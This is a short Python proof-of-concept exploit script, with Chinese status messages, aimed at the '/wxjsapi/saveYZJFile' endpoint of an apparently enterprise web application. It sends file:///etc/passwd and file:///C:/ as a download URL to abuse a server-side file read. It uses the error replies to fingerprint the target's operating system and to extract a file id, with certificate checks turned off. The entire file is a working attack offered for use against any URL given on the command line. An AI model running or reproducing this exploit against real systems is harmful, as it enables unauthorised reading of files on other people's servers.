import requests
import sys
import json
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def judge_poc(target_url):
    windows_url = target_url + "/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/&fileExt=txt"
    linux_url = target_url + "/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt"
    try:
        windows_response = requests.get(url=windows_url, headers=headers, verify=False, timeout=10)
        linux_response = requests.get(url=linux_url, headers=headers, verify=False, timeout=10)
        if "无法验证您的身份" in windows_response.text and "无法验证您的身份" in linux_response.text:
            print("\033[31m[x] 漏洞已修复，不存在漏洞 \033[0m")
            sys.exit(0)

        else:
            if "No such file or directory" in windows_response.text:
                print("\033[32m[o] 目标为 Linux 系统\033[0m")
                html = linux_response.text
                html_dic = json.loads(html)
                id = html_dic['id']
                print("\033[32m[o] 成功获取id：{}\033[0m".format(id))

            elif "系统找不到指定的路径" in linux_response.text:
                print("\033[32m[o] 目标为 Windows 系统\033[0m")
                html = windows_response.text
                html_dic = json.loads(html)
                id = html_dic['id']
                print("\033[32m[o] 成功获取id：{}\033[0m".format(id))


            else:
                print("\033[31m[x] 无法获取目标系统\033[0m")
                sys.exit(0)

    except Exception as e:
        print("\033[31m[x] 请求失败:{} \033[0m".format(e))
        sys.exit(0)



if __name__ == '__main__':
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    req = requests.session()
    target_url = sys.argv[1]
    headers = {
        'Proxy-Connection': 'keep-alive',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'
    }

    judge_poc(target_url)

